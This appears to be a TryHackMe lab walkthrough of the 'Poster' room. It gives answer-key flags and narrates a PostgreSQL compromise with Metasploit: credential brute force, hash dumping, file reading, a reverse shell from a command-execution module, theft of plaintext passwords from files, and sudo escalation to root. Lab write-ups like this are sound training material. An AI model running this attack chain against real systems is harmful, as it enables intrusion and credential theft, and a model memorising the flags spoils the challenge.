# <div align="center">[Poster - TryHackMe Walthrough](https://tryhackme.com/room/poster)</div>
<div align="center">The sys admin set up a rdbms in a safe way.</div>

<div align="center">
	<img width="200" height="200" alt="poster" src="https://github.com/user-attachments/assets/fa33b981-f75a-4c11-b2db-8e4a32367a5e" />
</div>

## Task 1. Flag

### What is rdbms?

Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.

Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.

Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.

Are you able to complete the challenge?
The machine may take up to 5 minutes to boot and configure

### *Answer the questions below*
#### What is the rdbms installed on the server?
```
postgresql
```

### What port is the rdbms running on?
```
5432
```

### Metasploit contains a variety of modules that can be used to enumerate in multiple rdbms, making it easy to gather valuable information.
```
No answer needed
```

### After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?
```
auxiliary/scanner/postgres/postgres_login
```

### What are the credentials you found?
```
postgres:password
```

### What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?
```
auxiliary/admin/postgres/postgres_sql
```

### Based on the results of #6, what is the rdbms version installed on the server?
```
9.5.21
```

### What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?
```
auxiliary/scanner/postgres/postgres_hashdump
```

### How many user hashes does the module dump?
```
6
```

### What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?
```
auxiliary/admin/postgres/postgres_readfile
```

### What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?
```
exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```
### Compromise the machine and locate user.txt
```
THM{postgresql_fa1l_conf1gurat1on}
```
### Escalate privileges and obtain root.txt
```
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```


---
## Initial Enumeration

I started with a basic Nmap scan to identify the exposed services running on the target machine.

```bash
~$ nmap -sV 10.49.190.166

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
```

The scan revealed three open ports:

* SSH running on port `22`
* HTTP running on port `80`
* PostgreSQL running on port `5432`

At this stage, the PostgreSQL service immediately stood out since the room description hinted toward an RDBMS setup.

---

# Finding Vulnerability

To interact with the PostgreSQL service, I moved into Metasploit and started looking for available PostgreSQL auxiliary modules.

```bash
msfconsole -q
```

After launching Metasploit, I searched for PostgreSQL-related auxiliary modules.

```bash
search auxiliary postgresql
```

The results displayed several PostgreSQL modules available inside Metasploit.

One module that immediately caught my attention was:

```bash
auxiliary/scanner/postgres/postgres_login
```

This module is used to brute force PostgreSQL credentials using common usernames and passwords.

I selected the module using:

```bash
use 4
```

<img width="1741" height="437" alt="image" src="https://github.com/user-attachments/assets/5bee1383-47a1-4d8d-a125-dbacfa8b56ff" />

Before running it, I checked the required configuration.

```bash
show config
```

The only mandatory value that needed to be configured was the target IP address.

```bash
set RHOSTS <IP>
```

<img width="1887" height="914" alt="image" src="https://github.com/user-attachments/assets/22562c38-3087-45ec-8900-6bb2fb75af59" />


With the configuration completed, I executed the module.

```bash
run
```

<img width="1381" height="655" alt="image" src="https://github.com/user-attachments/assets/0e2aff5c-181e-4006-9a5c-e7b7811328b2" />

The scan successfully discovered valid PostgreSQL credentials:

```bash
postgres:password
```

Now that I had working credentials, the next step was to find a module that would allow authenticated interaction with the PostgreSQL server.

I returned back and searched for PostgreSQL auxiliary modules again.

```bash
back
search auxiliary postgresql
```

<img width="1744" height="500" alt="image" src="https://github.com/user-attachments/assets/fbcd69ee-c7d5-42ee-9b4b-fc919c0e2981" />

This time, I selected:

```bash
auxiliary/admin/postgres/postgres_sql
```

The module allows execution of SQL queries against the PostgreSQL server using valid credentials.

I configured the module with the discovered password and target IP.

```bash
use 6
show options
set RHOSTS <IP>
set PASSWORD password
```

<img width="1428" height="822" alt="image" src="https://github.com/user-attachments/assets/2da4da05-d8cf-42c7-9ab3-fcae33fc3780" />


After setting the required options, I ran the module.

```bash
run
```


The authentication succeeded, confirming valid access to the PostgreSQL database server.

```bash
PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
```

<img width="1185" height="252" alt="image" src="https://github.com/user-attachments/assets/fd1aa141-ca4a-4ade-8b01-16299fb9f422" />

# Credential Discovery

After confirming authenticated access to PostgreSQL, my next objective was to dump the database user hashes.

I returned back to the Metasploit console and searched for a module related to PostgreSQL hash dumping.

```bash id="l9h3pj"
back
search auxiliary scanner postgre hashdump
```

<img width="1194" height="264" alt="image" src="https://github.com/user-attachments/assets/e87ea55a-58cd-4487-bb29-067cf0cbd048" />

The search returned the PostgreSQL hashdump module, which can extract password hashes from the database.

I selected the module and configured it with the previously discovered credentials.

```bash id="k1f6xa"
use 0
show options
set RHOST 10.49.190.166
set PASSWORD password
```

<img width="1429" height="683" alt="image" src="https://github.com/user-attachments/assets/399ee9d4-124d-41be-8668-9791f3d064a5" />

Once everything was configured, I executed the module.

```bash id="j84dpl"
run
```

<img width="644" height="387" alt="image" src="https://github.com/user-attachments/assets/d99b6e3c-15c5-484c-867b-675b7e98d5e2" />

The module successfully dumped the PostgreSQL user hashes from the server.

---

# User Enumeration

With authenticated database access confirmed, I moved on to another PostgreSQL auxiliary module that allows reading files directly from the target system.

I went back again and searched for PostgreSQL auxiliary modules.

```bash id="93h5yz"
back
search auxiliary postgresql
```

From the available modules, I selected:

```bash id="8d7qef"
auxiliary/admin/postgres/postgres_readfile
```

Alternatively, it could also be selected directly using:

```bash id="k0e8vc"
use 5
```

<img width="1744" height="480" alt="image" src="https://github.com/user-attachments/assets/9817035a-d7a5-47e3-bcfa-c91586525e93" />

Before running the module, I checked the available options.

```bash id="9a2r7m"
show options
```

<img width="1456" height="781" alt="image" src="https://github.com/user-attachments/assets/3a807664-cb93-46f5-a799-817ccaf559d6" />

After configuring the required parameters, I executed the module.

```bash id="t3g1kr"
run
```

<img width="1097" height="748" alt="image" src="https://github.com/user-attachments/assets/67192a58-b5e5-49e1-9ef4-f5d8128f737b" />

The module successfully read files from the target machine using the authenticated PostgreSQL session.

<img width="1291" height="630" alt="image" src="https://github.com/user-attachments/assets/d60f641e-1792-4adf-9788-9ec59c75e1c2" />

---
# Initial Access

After confirming authenticated PostgreSQL access, the next step was to gain command execution on the target machine.

I returned back to Metasploit and searched for PostgreSQL exploit modules related to command execution.

```bash id="s4e0pl"
back
search exploit postgres cmd
```

From the available results, I selected:

```bash id="owm5y4"
exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```

This module allows arbitrary command execution using valid PostgreSQL credentials.

I loaded the module using:

```bash id="x9i5g8"
use 0
```

<img width="1475" height="473" alt="image" src="https://github.com/user-attachments/assets/0e649f12-b3f4-4584-985c-8858278396e3" />

Next, I configured the required options.

```bash id="n7k4e2"
show options
set RHOST <IP>
set PASSWORD password
set LHOST tun0
```

<img width="1447" height="918" alt="image" src="https://github.com/user-attachments/assets/cd5b6913-74e8-4146-9a1d-318535e533cf" />

Once everything was configured, I executed the exploit.

```bash id="p0j2mv"
run
```

<img width="1603" height="438" alt="image" src="https://github.com/user-attachments/assets/67b50e92-43f4-4939-b84f-f3d2436f1f73" />

The exploit successfully returned a shell on the target machine.

To make the shell more stable and interactive, I upgraded it using Python PTY.

```bash id="r3u0dc"
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<img width="1605" height="551" alt="image" src="https://github.com/user-attachments/assets/758eaed8-8aeb-441a-9107-0a8d1b0485ad" />

---

# Lateral Movement

After getting shell access, I started enumerating the system manually.

Inside the `/home` directory, I found two user folders. One of them belonged to `alison`, which contained the user flag, but the current user did not have permission to access it.

While checking the second user directory, I discovered a credentials file inside `dark`'s home directory.

```bash id="9v4k1a"
cd /home
cat /home/dark/credentials.txt
```

The file contained valid credentials for the `dark` user.

```bash id="3w0mzc"
dark:qwerty1234#!hackme
```

<img width="853" height="558" alt="image" src="https://github.com/user-attachments/assets/db632694-0771-469a-a859-c76c5a956ee6" />

I used the discovered password to log in through SSH for a cleaner and more stable session.

```bash id="v5t8dy"
ssh dark@10.49.190.166
dark@10.49.190.166's password: qwerty1234#!hackme
$
```
# Credential Discovery

Even after switching to the `dark` user, I still did not have permission to access Alison’s user flag.

```bash id="r5k2dx"
cat /home/alison/user.txt
```

```bash id="o4v8mn"
cat: /home/alison/user.txt: Permission denied
```

At this point, I started checking the web application files for any exposed credentials or sensitive configuration files.

Inside the web root directory, I found a `config.php` file.

```bash id="b2f9wu"
cd /var/www/html/
ls
```

```bash id="k8m1et"
config.php  poster
```

I opened the configuration file to inspect its contents.

```bash id="v8c4zr"
cat config.php
```

```php id="n4z7pl"
<?php 
	
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
?>
```

The file exposed valid credentials for the `alison` user.

---

# Lateral Movement

Using the discovered password, I switched from the `dark` user to `alison`.

```bash id="v9q6ba"
su alison
```

```bash id="x2e7rm"
Password: p4ssw0rdS3cur3!#
```

After authenticating successfully, I accessed Alison’s home directory and read the user flag.

```bash id="m1j5tp"
cd
cat user.txt
```

---

# User Flag

```bash id="d7w4ce"
THM{postgresql_fa1l_conf1gurat1on}
```

---

# Privilege Escalation Enumeration

With access as `alison`, I checked the sudo permissions assigned to the account.

```bash id="u8g3lv"
sudo -l
```

```bash id="q5n0dy"
alison@ubuntu:~$ sudo -l

[sudo] password for alison: p4ssw0rdS3cur3!#

Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

The output confirmed that the `alison` user had full sudo privileges on the machine.

---

# Root Access

I escalated directly to a root shell using:

```bash id="y4k9nf"
sudo -s
```

After obtaining root access, I read the root flag.

```bash id="p3w7mx"
cat /root/root.txt
```

---

# Root Flag

```bash id="c6u2ra"
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```

<img width="1222" height="501" alt="image" src="https://github.com/user-attachments/assets/751858b4-f232-47b6-b2cc-ff911983ec23" />

Thanks for reading. Hope this walkthrough helped you solve the room and follow the exploitation process clearly.

If you enjoyed this walkthrough, you can check out more rooms and labs here:
* [Github](https://github.com/Esther7171/TryHackMe-Walkthroughs)
* [Medium](https://deathesther.medium.com/)
